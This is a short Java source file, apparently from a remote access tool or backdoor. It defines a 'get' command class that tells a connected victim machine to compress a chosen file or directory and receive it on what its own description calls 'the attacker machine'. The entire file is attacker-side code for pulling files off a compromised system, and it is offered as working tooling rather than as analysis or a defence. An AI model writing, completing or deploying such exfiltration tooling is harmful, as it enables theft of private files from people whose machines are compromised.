package commands;

import java.io.IOException;
import java.net.Socket;

import connection.Connection;
import connection.Server;

public class GetCommand extends Command{
	private String _command;
	
	public GetCommand() {
		super("get", "\"file/dir\"", "compress and sends the specified file/dir to the attacker machine");
	}

	protected boolean parse(String command) {
		boolean ok = false;
		
		if(command.contains(_commandName)) {
			_command = command;
			ok = true;
		}
		
		return ok;
	}
	
	@Override
	public void execute(Connection con, Server server) throws IOException, InterruptedException {
		String response = con.send(_command);
		System.out.println(response);
		
		if(response.contains("File compressed")) {
			server.receiveFile();
		}
	}
}